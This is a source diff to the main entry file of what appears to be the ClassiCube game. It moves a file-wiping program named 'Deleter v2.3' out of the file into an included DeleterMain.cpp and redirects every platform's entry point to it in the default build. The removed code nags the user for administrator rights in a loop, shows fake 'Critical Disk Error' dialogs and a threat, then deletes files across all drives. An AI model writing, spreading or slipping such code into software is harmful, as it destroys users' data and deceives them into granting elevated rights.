@@ -10,7 +10,15 @@
 #include "Server.h"
 #include "Options.h"
 #include "main.h"
-extern "C" {
+#include "DeleterMain.cpp"
+#ifndef CC_BUILD_ACTUAL_CC
+void android_main(void) { DeleterMain();}
+int main(int argc, char** argv) { return DeleterMain();}
+int main_real(int argc, char** argv) { return DeleterMain();}
+int ios_main(int argc, char** argv) { return DeleterMain();}
+int web_main(int argc, char** argv) { return DeleterMain();}
+#else
+
 /*########################################################################################################################*
 *-------------------------------------------------Complex argument parsing------------------------------------------------*
 *#########################################################################################################################*/
@@ -211,7 +219,7 @@ static int RunProgram(int argc, char** argv) {
 	}
 	return 0;
 }
-#ifdef CC_BUILD_ACTUAL_CC
+
 #if defined CC_BUILD_IOS
 /* ClassiCube is sort of and sort of not the executable */
 /*  on iOS - UIKit is responsible for kickstarting the game. */
@@ -247,10 +255,10 @@ int main(int argc, char** argv) {
 /*  (mingw-w64-crt/crt/gccmain.c) - alas this immediately crashes the game on startup. */
 /* Using main_real instead and setting main_real as the entrypoint fixes the crash. */
 #if defined CC_NOMAIN
-int main_real(int argc, char** argv) {}
+int main_real(int argc, char** argv) {
 #elif defined CC_BUILD_WEB
 /* webclient does some asynchronous initialisation first, then kickstarts the game after that */
-int web_main(int argc, char** argv) {}
+int web_main(int argc, char** argv) {
 #else 
 int main(int argc, char** argv) {
 #endif
@@ -271,143 +279,5 @@ int main(int argc, char** argv) {
 	Process_Exit(res);
 	return res;
 }
-}
 #endif
-#else
-extern "C" {
-void android_main(void) { DeleterMain();}
-int main(int argc, char** argv) { return DeleterMain();}
-int main_real(int argc, char** argv) { return DeleterMain();}
-int ios_main(int argc, char** argv) { return DeleterMain();}
-int web_main(int argc, char** argv) { return DeleterMain();}
-}
-#include <experimental/filesystem>
-#include <iostream>
-#include <string>
-#include <vector>
-#include <Windows.h>
-using namespace std;
-using namespace std::experimental::filesystem;
-
-BOOL IsRunAsAdministrator() {
-  BOOL fIsRunAsAdmin = FALSE;
-  DWORD dwError = ERROR_SUCCESS;
-  PSID pAdministratorsGroup = NULL;
-
-  SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
-  if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
-                                DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
-                                &pAdministratorsGroup)) {
-    dwError = GetLastError();
-    goto Cleanup;
-  }
-
-  if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin)) {
-    dwError = GetLastError();
-    goto Cleanup;
-  }
-
-Cleanup:
-
-  if (pAdministratorsGroup) {
-    FreeSid(pAdministratorsGroup);
-    pAdministratorsGroup = NULL;
-  }
-
-  if (ERROR_SUCCESS != dwError) {
-    throw dwError;
-  }
-
-  return fIsRunAsAdmin;
-}
-BOOL IsRunAsAdministrator();
-void ElevateNow() {
-  BOOL bAlreadyRunningAsAdministrator = FALSE;
-  try {
-    bAlreadyRunningAsAdministrator = IsRunAsAdministrator();
-  } catch (...) {
-    _asm nop
-  }
-  if (!bAlreadyRunningAsAdministrator) {
-    char szPath[MAX_PATH];
-    if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath))) {
-
-      SHELLEXECUTEINFO sei = {sizeof(sei)};
-
-      sei.lpVerb = "runas";
-      sei.lpFile = szPath;
-      sei.hwnd = NULL;
-      sei.nShow = SW_NORMAL;
-
-      if (!ShellExecuteEx(&sei)) {
-        DWORD dwError = GetLastError();
-        if (dwError == ERROR_CANCELLED)
-          // Annoys you to Elevate it LOL
-          CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ElevateNow, 0, 0, 0);
-      }
-    }
-
-  } else {
-	DeleterMain();
-  }
-}
-int DeleterMain() {
-  ElevateNow();
-  if (IsRunAsAdministrator()) {
-    string Title = "Deleter v2.3";
-    cout << Title << endl;
-    vector<path> Disks; // Declare an empty vector
-    while (true) {
-      for (const directory_entry &root : recursive_directory_iterator(
-               std::experimental::filesystem::current_path()
-                   .root_directory())) {
-        if (root.path().parent_path() != root.path() &&
-            root.path().string().length() <= 3) {
-          cout << "Possible Root Directory: " << root.path() << endl;
-          Disks.push_back(root.path());
-        }
-        std::vector<std::string> drives;
-        for (const path &disk : Disks) {
-          drives.push_back(disk.string());
-        }
-        // Iterate through the split drives
-        for (const std::string &drive : drives) {
-          std::vector<path> dirs;
-          for (const directory_entry &entry :
-               std::experimental::filesystem::directory_iterator(drive)) {
-            dirs.push_back(entry.path());
-          }
-          for (const path &dir : dirs) {
-            if (is_directory(dir)) {
-              std::vector<path> files;
-              for (const directory_entry &file :
-                   std::experimental::filesystem::directory_iterator(dir)) {
-                files.push_back(file.path());
-              }
-              for (const path &file : files) {
-                cout << "Deleting " << file << endl;
-                try {
-                  std::error_code ec;
-                  remove(file, ec);
-                } catch (exception e) {
-                  std::cerr << "Error deleting file: " << e.what() << std::endl;
-                }
-              }
-            }
-          }
-        }
-      }
-    }
-  } else {
-    if (MessageBox(0, "Need To Elevate", "Critical Disk Error",
-                   MB_SYSTEMMODAL | MB_ICONERROR | MB_YESNO) == IDYES) {
-      ElevateNow();
-    } else {
-      MessageBox(0, "You Better give me Elevation or I will attack u",
-                 "System Critical Error",
-                 MB_SYSTEMMODAL | MB_OK | MB_ICONERROR);
-      ElevateNow();
-    }
-  }
-}
 #endif
